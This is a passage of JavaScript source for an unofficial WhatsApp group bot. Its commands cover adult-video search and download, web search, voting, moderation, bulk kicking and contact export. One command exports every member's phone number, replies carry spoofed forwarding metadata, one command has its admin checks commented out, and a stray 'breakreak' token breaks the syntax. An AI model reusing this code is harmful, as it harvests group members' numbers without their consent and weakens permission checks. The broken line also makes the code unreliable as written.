          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygcveran('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Search Results for "${text}":*\n\n${searchResults}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return replygcveran('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
  if (!text)
    return replygcveran(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
        VeranBotInc.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        replygcveran('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      replygcveran('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionJid: VeranBotInc.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
      } else {
        replygcveran('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      replygcveran('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
breakreak
			case 'yts': case 'ytsearch': {
  if (!text) return replygcveran(`*Example :* ${prefix + command} title`);
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      replygcveran('No video found');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: VeranBotInc.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await VeranBotInc.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replygcveran(`Error`);
  }
}
break
			case 'wikipedia': case 'wiki': {
	if (!text) return replygcveran(`Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  replygcveran('⚠️ No results found ')
}
}
break
			case 'google': {
if (!q) return replygcveran(`Example : ${prefix + command} ${botname}`)
await VeranStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcveran(teks)
})
}
break
			case 'getjoinrequest':{
	if (!m.isGroup) return VeranStickGroup()
	if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
	const response = await VeranBotInc.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    VeranBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  VeranBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
			case 'addbadword': case 'addbd':
               if (!VeranTheCreator) return VeranStickOwner()
               if (args.length < 1) return replygcveran( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcveran('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!VeranTheCreator) return VeranStickOwner()
               if (args.length < 1) return replygcveran( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcveran('Successfully Deleted Bad Word!')
            break 
            case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcveran(teks)
}
break
			case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].badword = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].badword = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antinsfw':
            case 'nsfw':{
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].ntnsfw = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].ntnsfw = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await VeranBotInc.fetchStatus(who)
    replygcveran(bio.status)
  } catch {
    if (text) return replygcveran(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await VeranBotInc.fetchStatus(who)
      replygcveran(bio.status)
    } catch {
      return replygcveran(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return VeranStickGroup()
            if (m.chat in vote) return replygcveran(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcveran(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcveran(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            VeranBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return VeranStickGroup()
            if (!(m.chat in vote)) return replygcveran(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcveran('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            VeranBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return VeranStickGroup()
            if (!(m.chat in vote)) return replygcveran(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcveran('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            VeranBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return VeranStickGroup()
if (!(m.chat in vote)) return replygcveran(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${VeranBotInc.user.id}
`
VeranBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return VeranStickGroup()
            if (!(m.chat in vote)) return replygcveran(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcveran('Successfully Deleted Vote Session In This Group')
	    }
            break
break
			case 'closetime':
    if (!m.isGroup) return VeranStickGroup()
    // Remove admin check completely, allowing even non-admins to use the command
    // if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
    // Bypass the check for bot admin status for this specific case
    // if (!m.isBotAdmin) return VeranStickBotAdmin()

    if (args[1] == 'second') {
        var timer = args[0] * 1000
    } else if (args[1] == 'minute') {
        var timer = args[0] * 60000
    } else if (args[1] == 'hour') {
        var timer = args[0] * 3600000
    } else if (args[1] == 'day') {
        var timer = args[0] * 86400000
    } else {
        return replygcveran('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
    }

    replygcveran(`Close time ${q} starting from now`)
    setTimeout(() => {
        var nomor = m.participant
        const close = `*Close time* group closed by admin\nnow only admin can send messages`

        // Simulate the action as if we were setting the group to "announcement" mode
        replygcveran(close)
        // Send a message to notify admins to change the group settings manually
        VeranBotInc.sendMessage(m.chat, { text: 'Admins should set the group to announcement mode manually to restrict non-admin messages.' })

        // Since we can't actually change the group settings without being an admin, this acts as a workaround
        // Optionally, you can also send additional info on how to do it
    }, timer)
    break

            case 'opentime':
                if (!m.isGroup) return VeranStickGroup()
                if (!m.isAdmin && !VeranTheCreator) return replygcveran(mess.admin)
                if (!m.isBotAdmin) return VeranStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcveran('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcveran(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    VeranBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcveran(open)
                }, timer)
                break
			case 'editinfo':{
                if (!m.isGroup) return VeranStickGroup()
                if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
                if (!m.isBotAdmin) return VeranStickBotAdmin()
                if (args[0] === 'open') {
                    await VeranBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcveran(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await VeranBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcveran(`Successfully Closed Edit Group Info`))
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
			case 'getcontact': case 'getcon': {
if (!m.isGroup) return VeranStickGroup()
if (!(m.isAdmin || VeranTheCreator)) return VeranStickAdmin()
veranbigpp = await VeranBotInc.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
VeranBotInc.sendContact(m.chat, participants.map(a => a.id), veranbigpp)
}
break
case 'savecontact': case 'svcontact': {
    if (!m.isGroup) return VeranStickGroup()
    if (!(m.isAdmin || VeranTheCreator)) return VeranStickAdmin()

    let cmiggc = await VeranBotInc.groupMetadata(m.chat)
    let vcard = ''
    let noPort = 0

    for (let participant of cmiggc.participants) {
        let contactInfo = await VeranBotInc.onWhatsApp(participant.id) // Query for the WhatsApp-registered name
        let contactName = contactInfo?.[0]?.name || participant.id.split("@")[0] // Get WhatsApp name or fallback to the phone number

        vcard += `BEGIN:VCARD\n`
        vcard += `VERSION:3.0\n`
        vcard += `FN:${contactName}\n` // Full name
        vcard += `TEL;type=CELL;type=VOICE;waid=${participant.id.split("@")[0]}:+${participant.id.split("@")[0]}\n` // Phone number
        vcard += `END:VCARD\n`
    }

    let nmfilect = './contacts.vcf'
    replygcveran(`\nBe patient bro, saving... ${cmiggc.participants.length} contacts`)
    require('fs').writeFileSync(nmfilect, vcard.trim())
    await sleep(2000)
    VeranBotInc.sendMessage(m.chat, {
        document: require('fs').readFileSync(nmfilect), 
        mimetype: 'text/vcard', 
        fileName: 'Contact.vcf', 
        caption: `\nSucceed\nGroup: *${cmiggc.subject}*\nContact: *${cmiggc.participants.length}*`
    }, {ephemeralExpiration: 86400, quoted: m})

    require('fs').unlinkSync(nmfilect)
}
break



case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return VeranStickGroup()
if (!m.mentionedJid[0]) return replygcveran('\nUse like this\n Example:.sendcontact @tag name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
VeranBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return VeranStickGroup()
if (!(m.isAdmin || VeranTheCreator)) return VeranStickAdmin()
if (!m.mentionedJid[0]) return replygcveran('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
VeranBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
			case 'kickall': {
 if (!m.isGroup) return VeranStickGroup()
 if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
 if (!m.isBotAdmin) return VeranStickBotAdmin()
  const verankickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.db.groups[m.chat].welcome === true) {
 global.db.groups[m.chat].welcome = false;
  }
 for (let remove of verankickall) {
 await VeranBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcveran(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return VeranStickGroup()
 if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
 if (!m.isBotAdmin) return VeranStickBotAdmin()
  const veranpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of veranpromoteall) {
